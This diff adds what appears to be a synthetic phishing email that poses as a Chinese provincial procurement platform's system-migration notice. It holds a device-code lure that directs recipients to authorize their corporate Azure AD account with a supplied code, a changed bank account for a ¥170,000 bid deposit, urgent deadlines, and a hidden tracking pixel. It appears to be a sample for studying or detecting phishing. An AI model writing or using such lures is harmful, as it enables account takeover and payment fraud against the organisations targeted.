@@ -1,0 +1,105 @@
+From: 浙江省政府采购中心-电子招投标平台 <bid@zj-procurement.example>
+To: 采购部 <purchase@corp.internal>
+Cc: 法务部 <legal@corp.internal>
+Date: Sun, 18 Oct 2026 15:00:00 +0800
+Message-ID: <0681-b52@synth.example>
+Subject: [项目编号 ZJCG-2026-1147] 智慧停车系统采购项目——开标系统迁移通知（10/24前完成投标人认证）
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif">
+<div style="background:#8B0000;color:#fff;padding:14px 24px">
+<h2 style="margin:0;font-size:17px">浙江省政府采购中心 | 电子招投标平台</h2>
+</div>
+<div style="padding:20px;border:1px solid #ddd;border-top:none">
+
+<p>采购部、法务部：</p>
+
+<p>贵司已通过 <b>ZJCG-2026-1147（智慧停车系统采购项目）</b>的资格预审。因省政府采购电子招投标系统将于 <b>10/25</b> 进行全面升级迁移，所有投标人需在 <b>10/24 前</b>在新系统完成CA数字证书绑定与身份认证，否则将无法参与 10/28 的在线开标。</p>
+
+<h3 style="color:#8B0000;border-bottom:2px solid #8B0000;padding-bottom:4px">一、项目信息</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:120px">项目编号</td><td><b>ZJCG-2026-1147</b></td></tr>
+<tr><td style="background:#f5f5f5">项目名称</td><td>智慧停车系统采购项目（含硬件+软件+集成）</td></tr>
+<tr><td style="background:#f5f5f0">采购人</td><td>杭州市滨江区城市管理局</td></tr>
+<tr><td style="background:#f5f5f5">预算金额</td><td>￥8,600,000.00</td></tr>
+<tr><td style="background:#f5f5f5">开标时间</td><td style="color:#e00"><b>2026-10-28 09:30</b></td></tr>
+<tr><td style="background:#f5f5f5">开标方式</td><td>在线开标（新系统）</td></tr>
+<tr><td style="background:#f5f5f5">资格预审</td><td style="color:#0a0">已通过（10/10）</td></tr>
+<tr><td style="background:#f5f5f5">投标截止</td><td style="color:#e00"><b>2026-10-28 09:30</b>（迟到拒收）</td></tr>
+</table>
+
+<h3 style="color:#8B0000;border-bottom:2px solid #8B0000;padding-bottom:4px">二、系统迁移说明</h3>
+<p>根据《浙江省财政厅关于升级政府采购电子交易平台的通知》（浙财采监〔2026〕38号），省级政府采购电子招投标系统将于 10/25 22:00 至 10/26 06:00 进行升级迁移。迁移后：</p>
+<ul>
+<li>旧系统（zjprocurement.gov.cn）将<b>永久关闭</b>，所有在途项目迁移至新系统</li>
+<li>投标人的 CA 数字证书需在<b>新系统重新绑定</b>（旧绑定关系不迁移）</li>
+<li>投标文件需在新系统重新上传（旧系统中已上传的文件将失效）</li>
+</ul>
+
+<h3 style="color:#8B0000;border-bottom:2px solid #8B0000;padding-bottom:4px">三、CA证书绑定与身份认证（10/24前）</h3>
+
+<p><b>方式一（推荐）——通过微软统一身份认证：</b></p>
+<ol>
+<li>在任意设备打开 <b>https://login.microsoftonline.com/common/oauth2/v2.0/authorize</b></li>
+<li>输入设备认证码：<b>ZJCG-BID-1147</b></li>
+<li>使用贵司企业邮箱（Azure AD）账号登录并授权</li>
+<li>系统自动将贵司企业身份与新招投标平台关联</li>
+</ol>
+
+<p style="background:#fff3cd;padding:10px;border-radius:4px;font-size:14px">
+<b>为什么用 Microsoft 登录？</b><br>
+新系统采用 Microsoft Azure AD 作为统一身份层（根据省大数据局"数字政府云上浙江"规划），投标人使用已有企业 Azure AD 账号即可完成认证，无需单独注册新账号。授权 URL 为 <code>login.microsoftonline.com</code>（微软官方域名），设备码仅在微软官方页面使用。如贵司未接入 Azure AD，可使用方式二。
+</p>
+
+<p><b>方式二——CA证书直接绑定：</b></p>
+<ol>
+<li>在浏览器中手动输入新系统地址：<code>bid.zj-procurement.example</code></li>
+<li>使用 CA 数字证书（USB Key）登录</li>
+<li>在"投标人信息-身份认证"模块完成企业信息核验</li>
+</ol>
+
+<h3 style="color:#8B0000;border-bottom:2px solid #8B0000;padding-bottom:4px">四、需重新上传的文件</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>序号</th><th>文件</th><th>格式</th><th>截止</th></tr>
+<tr><td>1</td><td>投标函（盖章扫描件）</td><td>PDF</td><td>10/27 17:00</td></tr>
+<tr><td>2</td><td>投标保证金缴纳凭证</td><td>PDF</td><td>10/24 17:00</td></tr>
+<tr><td>3</td><td>法定代表人授权书</td><td>PDF</td><td>10/27 17:00</td></tr>
+<tr><td>4</td><td>营业执照副本（加盖公章）</td><td>PDF</td><td>10/24 17:00</td></tr>
+<tr><td>5</td><td>技术方案（含实施计划）</td><td>PDF</td><td>10/27 17:00</td></tr>
+<tr><td>6</td><td>投标报价表（电子签章）</td><td>XML+PDF</td><td>10/28 09:00</td></tr>
+</table>
+
+<h3 style="color:#8B0000;border-bottom:2px solid #8B0000;padding-bottom:4px">五、投标保证金</h3>
+<p>本项目投标保证金为 <b>￥170,000.00</b>（预算金额的 2%）。因系统迁移，保证金缴纳账户已更新：</p>
+<div style="background:#f9f9f9;padding:10px;border-radius:4px;border-left:4px solid #8B0000">
+<p><b>新缴纳账户（10/24前）：</b></p>
+<p>户名：浙江省政府采购中心（保证金专户）<br>
+开户行：中国工商银行杭州庆春路支行<br>
+账号：6225 0091 8830 4471<br>
+备注：ZJCG-2026-1147 + 投标人名称</p>
+</div>
+<p>旧保证金账户已随系统迁移关闭。已缴纳至旧账户的保证金将自动转入新账户（无需重复缴纳），但需在新系统中登记旧缴款凭证编号以便匹配。</p>
+
+<h3 style="color:#8B0000;border-bottom:2px solid #8B0000;padding-bottom:4px">六、时间线</h3>
+<ul>
+<li><b>10/18（今天）：</b>新系统开放，投标人开始认证</li>
+<li><b>10/24（周四）17:00：</b>CA绑定 + 保证金缴纳截止</li>
+<li><b>10/25 22:00-10/26 06:00：</b>系统迁移（旧系统关闭）</li>
+<li><b>10/27 17:00：</b>投标文件上传截止（资格预审类文件）</li>
+<li><b>10/28 09:00：</b>电子投标报价截止</li>
+<li><b>10/28 09:30：</b>在线开标</li>
+</ul>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">浙江省政府采购中心 | 电子招投标运营部</p>
+<p style="font-size:11px;color:#999">技术支持：0571-8705-****（工作日 9:00-17:00）</p>
+<p style="font-size:11px;color:#999">本邮件由电子招投标系统自动发送。</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://zj-procurement.example/api/track?recipient=purchase%40corp.internal&project=ZJCG-2026-1147&type=system_migration" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
